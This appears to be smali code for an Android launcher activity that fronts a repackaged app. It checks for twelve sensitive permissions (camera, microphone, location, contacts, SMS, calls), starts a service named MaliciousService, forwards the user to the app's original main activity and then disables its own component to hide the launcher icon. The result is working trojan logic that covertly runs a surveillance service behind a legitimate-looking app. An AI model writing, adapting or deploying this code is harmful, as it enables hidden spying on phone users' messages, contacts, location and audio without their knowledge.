.class public Lcom/example/android/LauncherActivity;
.super Landroid/app/Activity;
.source "LauncherActivity.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "LauncherActivity"


# direct methods
.method public constructor <init>()V
    .registers 1

    .line 13
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private findOriginalMainActivity()Landroid/content/ComponentName;
    .registers 4

    .line 113
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.MAIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 114
    const-string v1, "android.intent.category.LAUNCHER"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    .line 115
    invoke-virtual {p0}, Lcom/example/android/LauncherActivity;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 117
    invoke-virtual {p0}, Lcom/example/android/LauncherActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    .line 118
    const/4 v2, 0x0

    invoke-virtual {v1, v0, v2}, Landroid/content/pm/PackageManager;->queryIntentActivities(Landroid/content/Intent;I)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_20
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_47

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/pm/ResolveInfo;

    .line 119
    iget-object v1, v1, Landroid/content/pm/ResolveInfo;->activityInfo:Landroid/content/pm/ActivityInfo;

    iget-object v1, v1, Landroid/content/pm/ActivityInfo;->name:Ljava/lang/String;

    .line 121
    const-class v2, Lcom/example/android/LauncherActivity;

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_46

    .line 122
    new-instance v0, Landroid/content/ComponentName;

    invoke-virtual {p0}, Lcom/example/android/LauncherActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2, v1}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_45
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_45} :catch_48

    return-object v0

    .line 124
    :cond_46
    goto :goto_20

    .line 127
    :cond_47
    goto :goto_50

    .line 125
    :catch_48
    move-exception v0

    .line 126
    const-string v1, "LauncherActivity"

    const-string v2, "Error finding original main activity"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 128
    :goto_50
    const/4 v0, 0x0

    return-object v0
.end method

.method private hasAllPermissions()Z
    .registers 7

    .line 40
    const/16 v0, 0xc

    new-array v1, v0, [Ljava/lang/String;

    const-string v2, "android.permission.CAMERA"

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "android.permission.RECORD_AUDIO"

    const/4 v4, 0x1

    aput-object v2, v1, v4

    const/4 v2, 0x2

    const-string v5, "android.permission.ACCESS_FINE_LOCATION"

    aput-object v5, v1, v2

    const/4 v2, 0x3

    const-string v5, "android.permission.ACCESS_COARSE_LOCATION"

    aput-object v5, v1, v2

    const/4 v2, 0x4

    const-string v5, "android.permission.READ_EXTERNAL_STORAGE"

    aput-object v5, v1, v2

    const/4 v2, 0x5

    const-string v5, "android.permission.WRITE_EXTERNAL_STORAGE"

    aput-object v5, v1, v2

    const/4 v2, 0x6

    const-string v5, "android.permission.READ_CONTACTS"

    aput-object v5, v1, v2

    const/4 v2, 0x7

    const-string v5, "android.permission.SEND_SMS"

    aput-object v5, v1, v2

    const/16 v2, 0x8

    const-string v5, "android.permission.RECEIVE_SMS"

    aput-object v5, v1, v2

    const/16 v2, 0x9

    const-string v5, "android.permission.READ_SMS"

    aput-object v5, v1, v2

    const/16 v2, 0xa

    const-string v5, "android.permission.CALL_PHONE"

    aput-object v5, v1, v2

    const/16 v2, 0xb

    const-string v5, "android.permission.READ_PHONE_STATE"

    aput-object v5, v1, v2

    .line 55
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x17

    if-lt v2, v5, :cond_59

    .line 56
    const/4 v2, 0x0

    :goto_4b
    if-ge v2, v0, :cond_59

    aget-object v5, v1, v2

    .line 57
    invoke-virtual {p0, v5}, Lcom/example/android/LauncherActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-eqz v5, :cond_56

    .line 58
    return v3

    .line 56
    :cond_56
    add-int/lit8 v2, v2, 0x1

    goto :goto_4b

    .line 62
    :cond_59
    return v4
.end method

.method private launchOriginalAppAndFinish()V
    .registers 5

    .line 134
    const-string v0, "LauncherActivity"

    :try_start_2
    invoke-direct {p0}, Lcom/example/android/LauncherActivity;->findOriginalMainActivity()Landroid/content/ComponentName;

    move-result-object v1

    .line 135
    if-eqz v1, :cond_34

    .line 136
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    .line 137
    invoke-virtual {v2, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    .line 138
    const v3, 0x10008000

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 139
    invoke-virtual {p0, v2}, Lcom/example/android/LauncherActivity;->startActivity(Landroid/content/Intent;)V

    .line 140
    invoke-virtual {v1}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Original main activity launched: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 141
    goto :goto_39

    .line 142
    :cond_34
    const-string v1, "Could not find original main activity - app will close"

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_39
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_39} :catch_3a

    .line 146
    :goto_39
    goto :goto_40

    .line 144
    :catch_3a
    move-exception v1

    .line 145
    const-string v2, "Failed to launch original main activity"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 149
    :goto_40
    invoke-virtual {p0}, Lcom/example/android/LauncherActivity;->finish()V

    .line 150
    return-void
.end method

.method private startServiceAndHide()V
    .registers 6

    .line 68
    const-string v0, "LauncherActivity"

    :try_start_2
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/example/android/MaliciousService;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 69
    invoke-virtual {p0, v1}, Lcom/example/android/LauncherActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 70
    const-string v1, "MaliciousService started successfully"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_11} :catch_12

    .line 73
    goto :goto_18

    .line 71
    :catch_12
    move-exception v1

    .line 72
    const-string v2, "Failed to start MaliciousService"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 77
    :goto_18
    :try_start_18
    invoke-virtual {p0}, Lcom/example/android/LauncherActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {p0}, Lcom/example/android/LauncherActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    .line 78
    if-eqz v1, :cond_5e

    .line 80
    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    .line 81
    invoke-virtual {v1, v2}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 83
    invoke-direct {p0}, Lcom/example/android/LauncherActivity;->findOriginalMainActivity()Landroid/content/ComponentName;

    move-result-object v2

    .line 84
    if-eqz v2, :cond_59

    .line 85
    invoke-virtual {v1, v2}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    .line 86
    const/high16 v3, 0x10000000

    invoke-virtual {v1, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 87
    invoke-virtual {p0, v1}, Lcom/example/android/LauncherActivity;->startActivity(Landroid/content/Intent;)V

    .line 88
    invoke-virtual {v2}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Original main activity launched: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_5e

    .line 90
    :cond_59
    const-string v1, "Could not find original main activity"

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_5e
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_5e} :catch_5f

    .line 95
    :cond_5e
    :goto_5e
    goto :goto_65

    .line 93
    :catch_5f
    move-exception v1

    .line 94
    const-string v2, "Failed to launch original main activity"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 99
    :goto_65
    :try_start_65
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/example/android/LauncherActivity;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 100
    invoke-virtual {p0}, Lcom/example/android/LauncherActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const/4 v3, 0x2

    const/4 v4, 0x1

    invoke-virtual {v2, v1, v3, v4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 105
    const-string v1, "Launcher icon hidden successfully"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_7a
    .catch Ljava/lang/Exception; {:try_start_65 .. :try_end_7a} :catch_7b

    .line 108
    goto :goto_81

    .line 106
    :catch_7b
    move-exception v1

    .line 107
    const-string v2, "Failed to hide launcher icon"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 109
    :goto_81
    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 4

    .line 18
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 21
    invoke-direct {p0}, Lcom/example/android/LauncherActivity;->hasAllPermissions()Z

    move-result p1

    const-string v0, "LauncherActivity"

    if-eqz p1, :cond_12

    .line 23
    invoke-direct {p0}, Lcom/example/android/LauncherActivity;->startServiceAndHide()V

    .line 25
    invoke-direct {p0}, Lcom/example/android/LauncherActivity;->launchOriginalAppAndFinish()V

    goto :goto_24

    .line 28
    :cond_12
    const-string p1, "Permissions not granted, launching PermissionRequestActivity"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 29
    new-instance p1, Landroid/content/Intent;

    const-class v1, Lcom/example/android/PermissionRequestActivity;

    invoke-direct {p1, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 30
    invoke-virtual {p0, p1}, Lcom/example/android/LauncherActivity;->startActivity(Landroid/content/Intent;)V

    .line 32
    invoke-virtual {p0}, Lcom/example/android/LauncherActivity;->finish()V

    .line 36
    :goto_24
    const-string p1, "LauncherActivity onCreate completed"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 37
    return-void
.end method
